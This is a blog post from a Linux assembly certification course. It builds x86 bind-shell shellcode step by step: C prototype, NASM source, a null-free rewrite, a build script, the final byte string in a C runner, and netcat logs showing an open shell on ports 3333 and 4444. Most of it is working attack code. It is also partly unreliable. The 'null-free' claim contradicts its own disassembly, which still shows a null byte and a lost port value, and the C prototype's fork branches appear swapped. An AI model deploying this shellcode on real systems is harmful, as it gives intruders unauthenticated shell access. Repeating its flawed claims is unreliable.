# SLAE Assignment #1

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://securitytube-training.com/online‐courses/securitytube-linux-assembly-expert/

Student ID: SLAE-935

## Resources

* https://packetstormsecurity.com/files/11058/bindshell.c.html

## Assignment

Create a Shell_Bind_TCP shellcode

* Binds to a port
* Execute shell on incoming connections
* Port number should be easily configurable

## C prototype code:

To better understand how the tcp bind shellcode works, the following C implementation has been created (comments are in the code):

```c
// Filename: ShellBindTcp.c
// Author:  SLAE-935
//
// Purpose: spawn /bin/sh on tcp port handling multiple connections

#include <stdio.h>
#include <stdlib.h>
#include <strings.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define BIND_PORT 3333

int main (int argc, char *argv[])
{ 
    // Declare vars
    int soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
    struct sockaddr_in serv_addr; 
    struct sockaddr_in client_addr;

    // Create socket
    soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
    if (soc_des == -1) 
        exit(-1); 

    // Local port binding
    bzero((char *) &serv_addr, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET; 
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(BIND_PORT);
    soc_rc = bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    if (soc_rc != 0) 
        exit(-1); 

    if (fork() != 0) 
        exit(0); 
    setpgrp();  
    signal(SIGHUP, SIG_IGN); 
    if (fork() != 0) 
        exit(0); 

    // Start listening on the binding port
    soc_rc = listen(soc_des, 5);
    if (soc_rc != 0) 
        exit(0); 

    while (1) { 
        soc_len = sizeof(client_addr);
        soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len);
        if (soc_cli < 0) 
            exit(0); 
        cli_pid = getpid(); 
        server_pid = fork(); 
        // If child handle new connection
        if (server_pid != 0) {
            // Duplicate descriptors
            dup2(soc_cli,0); // standard input
            dup2(soc_cli,1); // standard output
            dup2(soc_cli,2); // standard error

            // Execute /bin/sh
            execl("/bin/sh","sh",(char *)0);

            // when connection terminate exit the thread 
            close(soc_cli); 
            exit(0); 
        } 
    close(soc_cli);
    }
}
```

## Assembler Code:

In order to create an analogue asm shellcode it's first necessary to retrieve some information related to syscalls (from http://syscalls.kernelgrok.com/)

### Function: socket
* File: net/socket.c:2210 
* EAX: 0x66
* EBX: 0x1
* ECX: unsigned long __user *args (AF_INET, SOCK_STREAM, IPPROTO_TCP)
* EDX: -
* ESI: -
* EDI: -

### Function: bind
* File: net/socket.c:2210 
* EAX: 0x66
* EBX: 0x2
* ECX: unsigned long __user *args (int sockfd, const struct sockaddr *addr, socklen_t addrlen)
* EDX: -
* ESI: -
* EDI: -

### Function: listen
* File: net/socket.c:2210 
* EAX: 0x66
* EBX: 0x4
* ECX: unsigned long __user *args (int sockfd, int backlog)
* EDX: -
* ESI: -
* EDI: -

### Function: accept
* File: net/socket.c:2210 
* EAX: 0x66
* EBX: 0x5
* ECX: unsigned long __user *args (int sockfd, struct sockaddr *addr, socklen_t *addrlen)
* EDX: -
* ESI: -
* EDI: -

### Function: dup2
* File: fs/fcntl.c:116 
* EAX: 0x3f
* EBX: unsigned int oldfd
* ECX: unsigned int newfd
* EDX: -
* ESI: -
* EDI: -

### Function: execl
* File: arch/alpha/kernel/entry.S:925 
* EAX: 0x0b
* EBX: char __user *
* ECX: char __user *__user *
* EDX: char __user *__user *
* ESI: struct pt_regs *
* EDI: -

### Function: exit
* File: kernel/exit.c:1046 
* EAX: 0x01
* EBX: int error_code
* ECX: -
* EDX: -
* ESI: -
* EDI: -

### Function: fork
* File: arch/alpha/kernel/entry.S:716
* EAX: 0x02
* EBX: struct pt_regs *
* ECX: -
* EDX: -
* ESI: -
* EDI: -

The complete assembler program is the following:

```asm
; Filename: ShellBindTcp.nasm
; Author:  SLAE-935
;
; Purpose: spawn /bin/sh on tcp port handling multiple connections

global _start			

section .text

_start:

    ; Socket
    ; soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    ; EAX = socket_call = 102
    ; EBX = SYS_SOCKET = 1
    ; ECX = pointer to ESP (IPPROTO_TCP, SOCK_STREAM, AF_INET)
    mov eax, 102
    mov ebx, 1
    push 6 ; IPPROTO_TCP
    push 1 ; SOCK_STREAM
    push 2 ; AF_INET
    mov ecx, esp ; ptr to argument array
    int 0x80 
    ; EAX = ret value (socket descriptor)

    mov edi, eax ; save socket descriptor in edi

    ; Bind
    ; bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    ; EAX = socket_call = 102
    ; EBX = SYS_BIND=2
    ; ECX = pointer to ESP (16, ptr (struct sockaddr), edi)
    mov eax, 102
    mov ebx, 2

    ; build sockaddr_in structure
    ; by definition
    ; struct sockaddr_in {
    ;   short            sin_family;   // AF_INET -> 2 bytes
    ;   unsigned short   sin_port;     // 2 bytes
    ;   struct in_addr   sin_addr;     // see struct in_addr, below
    ;   char             sin_zero[8];  // 8 bytes
    ; };
    ;   
    ;   struct in_addr {
    ;       unsigned long s_addr;  // 4 bytes
    ;   };
    ;
    ; shellcode usage:
    ; serv_addr.sin_family = AF_INET; 
    ; serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    ; serv_addr.sin_port = htons(BIND_PORT); 

    ; Reverse pushing
    push 0 ; htonl(INADDR_ANY)
    push WORD 0x050d ; htons(3333) -> word = 2bytes
    push WORD 2 ; AF_INET -> word = 2bytes

    mov ecx, esp ; pointer to struct sockaddr_in serv_addr

    ; push args
    push 16 ; sizeof(sin_family (2 bytes) + sin_port (2 bytes) + sin_addr (4 bytes) + sin_zero (8 bytes))
    push ecx ; (struct sockaddr *) &serv_addr
    push edi ; soc_des

    mov ecx, esp ; ptr to argument array

    int 0x80
    ; EAX = return value (0x00000000 - success, 0xffffffff - error)

    ; Listen
    ; soc_rc = listen(soc_des, 5)
    ; EAX = socket_call=102
    ; EBX = SYS_LISTEN=4
    ; ECX = pointer to ESP (5, EDI)
    mov eax, 102
    mov ebx, 4

    push 5 ; 
    push edi ; soc_des

    mov ecx, esp		; ptr to argument array

    int 0x80
    ; EAX = return value (0 - success, -1 - error)

accept_handler:

    ; Accept
    ; soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len)
    ; EAX = socket_call = 102
    ; EBX = SYS_ACCEPT = 5
    ; ECX = pointer to ESP (0, 0, EDI)
    mov eax, 102
    mov ebx, 5

    push 0 ; &soc_len = 0 not used
    push 0 ; (struct sockaddr *) &client_addr = 0 not used
    push EDI ; soc_des
    mov ecx, esp ; ptr to argument array

    int 0x80
    ; EAX = return value (file descriptor) soc_cli

    mov esi, eax ; now esi contains soc_cli

    ; Fork
    ; fork()
    ; EAX = fork = 2
    mov eax, 2

    int 0x80
    ; EAX = return value (process PID)

    ; if PID != 0 then parent process/Error
    or eax, eax
    jnz parent_or_error
    
    ; close(sock)
    ; EAX = close = 6
    ; EBX = file descriptor
    ; close master socket
    mov eax, 0x06
    mov ebx, edi
    int 0x80
    ; EAX = return value (0 - success, -1 - error)

    ; Dup2
    ; dup2(soc_cli,0); // standard input
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = ESI = soc_cli
    ; ECX = Standard Input = 0
    mov eax, 63 
    mov ebx, esi
    mov ecx, 0

    int 0x80

    ; dup2(soc_cli,1);
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = ESI = soc_cli
    ; ECX = Standard Output = 1
    mov eax, 63
    mov ecx, 1

    int 0x80

    ; dup2(soc_cli,2);
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = ESI = soc_cli
    ; ECX = Standard Error = 2
    mov eax, 63
    mov ecx, 2

    int 0x80

    ; Execl
    ; execl("/bin/sh","sh",(char *)0);
    ; EAX = execl = 11
    ; EBX = ptr /bin//sh,\0
    ; ECX = ptr 0 (argv[0])
    ; EDX = ptr 0 (envp)
    mov eax, 11

    ;/bin//sh -> 0x2f62696e2f2f7368
    push 0 ; '\0' null terminator
    push 0x68732f2f ; //sh <-little endian
    push 0x6e69622f ; /bin <-little endian
    mov ebx, esp ; pointer to "/bin/sh"\0

    mov ecx, 0
    mov edx, 0

    int 0x80

parent_or_error:

    ; parent process
    ; need to close client socket fd (stored in ESI)

    ; close(sock)
    ; EAX = close = 6
    ; EBX = close client socket - fd is stored in ESI
    mov eax, 6
    mov ebx, esi
    int 0x80
    jmp accept_handler
```

## Check for null bytes

The shellcode has some issues since many null bytes are present, and such null terminator character may break the shellcode execution. The code must be reworked in order to be null free:

Upon compilation, using objdump, in the following code segment are reported the null bytes:

```shell
$ ./compile.sh ShellBindTcp
######### NASM #########
[+] Assembling with Nasm ... 
[+] Linking ...
[+] Done!
######### GCC #########
[+] Assembling with Gcc ... 

*** Checking for null terminators

ShellBindTcp:     file format elf32-i386


Disassembly of section .text:

08048080 <_start>:
 8048080:	b8 66 00 00 00       	mov    eax,0x66 <--- Null Byte
 8048085:	bb 01 00 00 00       	mov    ebx,0x1 <--- Null Byte
 804808a:	6a 06                	push   0x6
 804808c:	6a 01                	push   0x1
 804808e:	6a 02                	push   0x2
 8048090:	89 e1                	mov    ecx,esp
 8048092:	cd 80                	int    0x80
 8048094:	89 c7                	mov    edi,eax
 8048096:	b8 66 00 00 00       	mov    eax,0x66 <--- Null Byte
 804809b:	bb 02 00 00 00       	mov    ebx,0x2 <--- Null Byte
 80480a0:	6a 00                	push   0x0 <--- Null Byte
 80480a2:	66 68 05 0d          	pushw  0xd05
 80480a6:	66 6a 02             	pushw  0x2
 80480a9:	89 e1                	mov    ecx,esp
 80480ab:	6a 10                	push   0x10
 80480ad:	51                   	push   ecx
 80480ae:	57                   	push   edi
 80480af:	89 e1                	mov    ecx,esp
 80480b1:	cd 80                	int    0x80
 80480b3:	b8 66 00 00 00       	mov    eax,0x66 <--- Null Byte 
 80480b8:	bb 04 00 00 00       	mov    ebx,0x4 <--- Null Byte
 80480bd:	6a 05                	push   0x5
 80480bf:	57                   	push   edi
 80480c0:	89 e1                	mov    ecx,esp
 80480c2:	cd 80                	int    0x80

080480c4 <accept_handler>:
 80480c4:	b8 66 00 00 00       	mov    eax,0x66 <--- Null Byte
 80480c9:	bb 05 00 00 00       	mov    ebx,0x5 <--- Null Byte
 80480ce:	6a 00                	push   0x0 <--- Null Byte
 80480d0:	6a 00                	push   0x0 <--- Null Byte
 80480d2:	57                   	push   edi
 80480d3:	89 e1                	mov    ecx,esp
 80480d5:	cd 80                	int    0x80
 80480d7:	89 c6                	mov    esi,eax
 80480d9:	b8 02 00 00 00       	mov    eax,0x2 <--- Null Byte
 80480de:	cd 80                	int    0x80
 80480e0:	09 c0                	or     eax,eax
 80480e2:	75 4e                	jne    8048132 <parent_or_error>
 80480e4:	b8 06 00 00 00       	mov    eax,0x6 <--- Null Byte
 80480e9:	89 fb                	mov    ebx,edi
 80480eb:	cd 80                	int    0x80
 80480ed:	b8 3f 00 00 00       	mov    eax,0x3f <--- Null Byte
 80480f2:	89 f3                	mov    ebx,esi
 80480f4:	b9 00 00 00 00       	mov    ecx,0x0 <--- Null Byte
 80480f9:	cd 80                	int    0x80
 80480fb:	b8 3f 00 00 00       	mov    eax,0x3f <--- Null Byte
 8048100:	b9 01 00 00 00       	mov    ecx,0x1 <--- Null Byte
 8048105:	cd 80                	int    0x80
 8048107:	b8 3f 00 00 00       	mov    eax,0x3f <--- Null Byte
 804810c:	b9 02 00 00 00       	mov    ecx,0x2 <--- Null Byte
 8048111:	cd 80                	int    0x80
 8048113:	b8 0b 00 00 00       	mov    eax,0xb <--- Null Byte
 8048118:	6a 00                	push   0x0 <--- Null Byte
 804811a:	68 2f 2f 73 68       	push   0x68732f2f
 804811f:	68 2f 62 69 6e       	push   0x6e69622f
 8048124:	89 e3                	mov    ebx,esp
 8048126:	b9 00 00 00 00       	mov    ecx,0x0 <--- Null Byte
 804812b:	ba 00 00 00 00       	mov    edx,0x0 <--- Null Byte
 8048130:	cd 80                	int    0x80

08048132 <parent_or_error>:
 8048132:	b8 06 00 00 00       	mov    eax,0x6 <--- Null Byte
 8048137:	89 f3                	mov    ebx,esi
 8048139:	cd 80                	int    0x80
 804813b:	eb 87                	jmp    80480c4 <accept_handler> 
```

null free shellcode:

```asm
; Filename: ShellBindTcp.nasm
; Author:  SLAE-935
;
; Purpose: spawn /bin/sh on tcp port handling multiple connections (null free version)

global _start			

section .text

_start:

    ; Socket
    ; soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    ; EAX = socket_call = 102
    ; EBX = SYS_SOCKET = 1
    ; ECX = pointer to ESP (IPPROTO_TCP, SOCK_STREAM, AF_INET)
    xor eax, eax
    mov al, 102
    xor ebx, ebx
    mov bl, 1
    push 6 ; IPPROTO_TCP
    push 1 ; SOCK_STREAM
    push 2 ; AF_INET
    mov ecx, esp ; ptr to argument array
    int 0x80 
    ; EAX = ret value (socket descriptor)

    mov edi, eax ; save socket descriptor in edi

    ; Bind
    ; bind(soc_des, (struct sockaddr *) &serv_addr, sizeof(serv_addr));
    ; EAX = socket_call = 102
    ; EBX = SYS_BIND=2
    ; ECX = pointer to ESP (16, ptr (struct sockaddr), edi)
    xor eax, eax
    mov al, 102
    xor ebx, ebx
    mov bl, 2

    ; build sockaddr_in structure
    ; by definition
    ; struct sockaddr_in {
    ;   short            sin_family;   // AF_INET -> 2 bytes
    ;   unsigned short   sin_port;     // 2 bytes
    ;   struct in_addr   sin_addr;     // see struct in_addr, below
    ;   char             sin_zero[8];  // 8 bytes
    ; };
    ;   
    ;   struct in_addr {
    ;       unsigned long s_addr;  // 4 bytes
    ;   };
    ;
    ; shellcode usage:
    ; serv_addr.sin_family = AF_INET; 
    ; serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    ; serv_addr.sin_port = htons(BIND_PORT); 

    ; Reverse pushing
    xor ecx, ecx
    push ecx ; htonl(INADDR_ANY)
    push WORD 0x0D05 ; htons(3333) -> word = 2bytes
    push WORD 2 ; AF_INET -> word = 2bytes

    mov ecx, esp ; pointer to struct sockaddr_in serv_addr

    ; push args
    push 16 ; sizeof(sin_family (2 bytes) + sin_port (2 bytes) + sin_addr (4 bytes) + sin_zero (8 bytes))
    push ecx ; (struct sockaddr *) &serv_addr
    push edi ; soc_des

    mov ecx, esp ; ptr to argument array

    int 0x80
    ; EAX = return value (0x00000000 - success, 0xffffffff - error)

    ; Listen
    ; soc_rc = listen(soc_des, 5)
    ; EAX = socket_call=102
    ; EBX = SYS_LISTEN=4
    ; ECX = pointer to ESP (5, EDI)
    xor eax, eax
    mov al, 102
    xor ebx, ebx
    mov bl, 4

    push 5 ; 
    push edi ; soc_des

    mov ecx, esp		; ptr to argument array

    int 0x80
    ; EAX = return value (0 - success, -1 - error)

accept_handler:

    ; Accept
    ; soc_cli = accept(soc_des, (struct sockaddr *) &client_addr, &soc_len)
    ; EAX = socket_call = 102
    ; EBX = SYS_ACCEPT = 5
    ; ECX = pointer to ESP (0, 0, EDI)
    xor eax, eax
    mov al, 102
    xor ebx, ebx
    mov bl, 5
    xor ecx, ecx
    push ecx ; &soc_len = 0 not used
    push ecx ; (struct sockaddr *) &client_addr = 0 not used
    push EDI ; soc_des
    mov ecx, esp ; ptr to argument array

    int 0x80
    ; EAX = return value (file descriptor) soc_cli

    mov esi, eax ; now esi contains soc_cli

    ; Fork
    ; fork()
    ; EAX = fork = 2
    xor eax, eax
    mov al, 2

    int 0x80
    ; EAX = return value (process PID)

    ; if PID != 0 then parent process/Error
    or eax, eax
    jnz parent_or_error
    
    ; close(sock)
    ; EAX = close = 6
    ; EBX = file descriptor
    ; close master socket
    xor eax, eax
    mov al, 6
    mov ebx, edi
    int 0x80
    ; EAX = return value (0 - success, -1 - error)

    ; Dup2
    ; dup2(soc_cli,0); // standard input
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = ESI = soc_cli
    ; ECX = Standard Input = 0
    xor eax, eax
    mov al, 63 
    mov ebx, esi
    xor ecx, ecx
    mov cl, 1
    dec cl

    int 0x80

    ; dup2(soc_cli,1);
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = ESI = soc_cli
    ; ECX = Standard Output = 1
    xor eax, eax
    mov al, 63
    xor ecx, ecx
    mov cl, 1

    int 0x80

    ; dup2(soc_cli,2);
    ; EAX = dup2 = 63
    ; EBX = socket file descritor number = ESI = soc_cli
    ; ECX = Standard Error = 2
    xor eax, eax
    mov al, 63
    xor ecx, ecx
    mov cl, 2

    int 0x80

    ; Execl
    ; execl("/bin/sh","sh",(char *)0);
    ; EAX = execl = 11
    ; EBX = ptr /bin//sh,\0
    ; ECX = ptr 0 (argv[0])
    ; EDX = ptr 0 (envp)
    xor eax, eax
    mov al, 11

    ;/bin//sh -> 0x2f62696e2f2f7368
    xor ebx, ebx
    push byte ebx ; '\0' null terminator
    push 0x68732f2f ; //sh <-little endian
    push 0x6e69622f ; /bin <-little endian
    mov ebx, esp ; pointer to "/bin/sh"\0

    xor ecx, ecx
    mov cl, 1
    dec cl

    xor ecx, ecx
    mov dl, cl

    int 0x80

parent_or_error:

    ; parent process
    ; need to close client socket fd (stored in ESI)

    ; close(sock)
    ; EAX = close = 6
    ; EBX = close client socket - fd is stored in ESI
    xor eax, eax
    mov al, 6
    mov ebx, esi
    int 0x80
    jmp accept_handler
```

as visible the assembler program now doesn't contain any null character

```shell
$ ./compile.sh ShellBindTcpNullFree
######### NASM #########
[+] Configuring port 
[+] Assembling with Nasm ... 
ShellBindTcpNullFree.nasm_:186: warning: register size specification ignored
[+] Done!
[+] Linking ...
[+] Done!
[+] Objdump ...

./ShellBindTcpNullFree:     file format elf32-i386


Disassembly of section .text:

08048080 <_start>:
 8048080:	31 c0                	xor    eax,eax
 8048082:	b0 66                	mov    al,0x66
 8048084:	31 db                	xor    ebx,ebx
 8048086:	b3 01                	mov    bl,0x1
 8048088:	6a 06                	push   0x6
 804808a:	6a 01                	push   0x1
 804808c:	6a 02                	push   0x2
 804808e:	89 e1                	mov    ecx,esp
 8048090:	cd 80                	int    0x80
 8048092:	89 c7                	mov    edi,eax
 8048094:	31 c0                	xor    eax,eax
 8048096:	b0 66                	mov    al,0x66
 8048098:	31 db                	xor    ebx,ebx
 804809a:	b3 02                	mov    bl,0x2
 804809c:	31 c9                	xor    ecx,ecx
 804809e:	51                   	push   ecx
 804809f:	66 6a 00             	pushw  0x0
 80480a2:	66 6a 02             	pushw  0x2
 80480a5:	89 e1                	mov    ecx,esp
 80480a7:	6a 10                	push   0x10
 80480a9:	51                   	push   ecx
 80480aa:	57                   	push   edi
 80480ab:	89 e1                	mov    ecx,esp
 80480ad:	cd 80                	int    0x80
 80480af:	31 c0                	xor    eax,eax
 80480b1:	b0 66                	mov    al,0x66
 80480b3:	31 db                	xor    ebx,ebx
 80480b5:	b3 04                	mov    bl,0x4
 80480b7:	6a 05                	push   0x5
 80480b9:	57                   	push   edi
 80480ba:	89 e1                	mov    ecx,esp
 80480bc:	cd 80                	int    0x80

080480be <accept_handler>:
 80480be:	31 c0                	xor    eax,eax
 80480c0:	b0 66                	mov    al,0x66
 80480c2:	31 db                	xor    ebx,ebx
 80480c4:	b3 05                	mov    bl,0x5
 80480c6:	31 c9                	xor    ecx,ecx
 80480c8:	51                   	push   ecx
 80480c9:	51                   	push   ecx
 80480ca:	57                   	push   edi
 80480cb:	89 e1                	mov    ecx,esp
 80480cd:	cd 80                	int    0x80
 80480cf:	89 c6                	mov    esi,eax
 80480d1:	31 c0                	xor    eax,eax
 80480d3:	b0 02                	mov    al,0x2
 80480d5:	cd 80                	int    0x80
 80480d7:	09 c0                	or     eax,eax
 80480d9:	75 49                	jne    8048124 <parent_or_error>
 80480db:	31 c0                	xor    eax,eax
 80480dd:	b0 06                	mov    al,0x6
 80480df:	89 fb                	mov    ebx,edi
 80480e1:	cd 80                	int    0x80
 80480e3:	31 c0                	xor    eax,eax
 80480e5:	b0 3f                	mov    al,0x3f
 80480e7:	89 f3                	mov    ebx,esi
 80480e9:	31 c9                	xor    ecx,ecx
 80480eb:	b1 01                	mov    cl,0x1
 80480ed:	fe c9                	dec    cl
 80480ef:	cd 80                	int    0x80
 80480f1:	31 c0                	xor    eax,eax
 80480f3:	b0 3f                	mov    al,0x3f
 80480f5:	31 c9                	xor    ecx,ecx
 80480f7:	b1 01                	mov    cl,0x1
 80480f9:	cd 80                	int    0x80
 80480fb:	31 c0                	xor    eax,eax
 80480fd:	b0 3f                	mov    al,0x3f
 80480ff:	31 c9                	xor    ecx,ecx
 8048101:	b1 02                	mov    cl,0x2
 8048103:	cd 80                	int    0x80
 8048105:	31 c0                	xor    eax,eax
 8048107:	b0 0b                	mov    al,0xb
 8048109:	31 db                	xor    ebx,ebx
 804810b:	53                   	push   ebx
 804810c:	68 2f 2f 73 68       	push   0x68732f2f
 8048111:	68 2f 62 69 6e       	push   0x6e69622f
 8048116:	89 e3                	mov    ebx,esp
 8048118:	31 c9                	xor    ecx,ecx
 804811a:	b1 01                	mov    cl,0x1
 804811c:	fe c9                	dec    cl
 804811e:	31 c9                	xor    ecx,ecx
 8048120:	88 ca                	mov    dl,cl
 8048122:	cd 80                	int    0x80

08048124 <parent_or_error>:
 8048124:	31 c0                	xor    eax,eax
 8048126:	b0 06                	mov    al,0x6
 8048128:	89 f3                	mov    ebx,esi
 804812a:	cd 80                	int    0x80
 804812c:	eb 90                	jmp    80480be <accept_handler>
```
## Script for shellcode Customization:

The following shell script allows easy shellcode customization, by providing the new port number on the command line as second argument:

```shell
#!/bin/bash

echo '######### NASM #########'
echo '[+] Configuring port '$2
port=`printf %04X $2 |grep -o ..|tac|tr -d '\n'`
sed s/0D05/$port/ <$1.nasm >$1.nasm_$2

echo '[+] Assembling with Nasm ... '
nasm -f elf32 -o $1.o $1.nasm_$2
echo '[+] Done!'

rm -rf $1.nasm_$2

echo '[+] Linking ...'
ld -z execstack -o $1 $1.o
echo '[+] Done!'

echo '[+] Objdump ...'
mycode=`objdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\x/g'|paste -d '' -s |sed 's/^/"/' | sed 's/$/"/g'`

echo '[+] Assemble shellcode.c ...'
 
echo "#include<stdio.h>" >shellcode.c
echo "#include<string.h>" >>shellcode.c
echo "unsigned char code[] = \\" >>shellcode.c
echo $mycode";" >>shellcode.c
echo "main()" >>shellcode.c
echo "{" >>shellcode.c
echo "printf(\"Shellcode Length:  %d\n\", strlen(code));" >>shellcode.c
echo "  int (*ret)() = (int(*)())code;" >>shellcode.c
echo "  ret();" >>shellcode.c
echo "}" >>shellcode.c
 
echo '[+] Compile shellcode.c'
 
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
 
echo '[+] Done!'

echo '######### GCC #########'
echo '[+] Assembling native c implementation with Gcc ... '
gcc ShellBindTcp.c -o ShellBindTcp.c_bin
echo '[+] Done!'
echo
```

## Final wrapped shellcode:

The final generated c code is:
```
#include<stdio.h>
#include<string.h>
unsigned char code[] = \
"\x31\xc0\xb0\x66\x31\xdb\xb3\x01\x6a\x06\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x31\xc0\xb0\x66\x31\xdb\xb3\x02\x31\xc9\x51\x66\x6a\x00\x66\x6a\x02\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x6a\x05\x57\x89\xe1\xcd\x80\x31\xc0\xb0\x66\x31\xdb\xb3\x05\x31\xc9\x51\x51\x57\x89\xe1\xcd\x80\x89\xc6\x31\xc0\xb0\x02\xcd\x80\x09\xc0\x75\x49\x31\xc0\xb0\x06\x89\xfb\xcd\x80\x31\xc0\xb0\x3f\x89\xf3\x31\xc9\xb1\x01\xfe\xc9\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x31\xc9\xb1\x02\xcd\x80\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xb1\x01\xfe\xc9\x31\xc9\x88\xca\xcd\x80\x31\xc0\xb0\x06\x89\xf3\xcd\x80\xeb\x90";
main()
{
printf("Shellcode Length:  %d\n", strlen(code));
  int (*ret)() = (int(*)())code;
  ret();
}
```

## Proof of execution

The execution yelds the following:

Shellcode execution:

```
$ ./shellcode 
Shellcode Length:  33

```

and connection:

```
$ nc -vv localhost 3333
Connection to localhost 3333 port [tcp/*] succeeded!
id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare),999(admin)
```

## Proof of execution changing port
Configuring with a different port
```
$ ./compile.sh ShellBindTcpNullFree 4444
######### NASM #########
[+] Configuring port 4444
[+] Assembling with Nasm ... 
ShellBindTcpNullFree.nasm_4444:186: warning: register size specification ignored
[+] Done!
[+] Linking ...
[+] Done!
[+] Objdump ...
[+] Assemble shellcode.c ...
[+] Compile shellcode.c
[+] Done!
######### GCC #########
[+] Assembling native c implementation with Gcc ... 
[+] Done!
```

Executing the shellcode:

```
vagrant@precise32:/slae_code/Assignment 1$ ./shellcode 
Shellcode Length:  175

```

Connecting to the bind shell

```
$ nc -vv localhost 4444
Connection to localhost 4444 port [tcp/*] succeeded!
id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),110(sambashare),999(admin)
```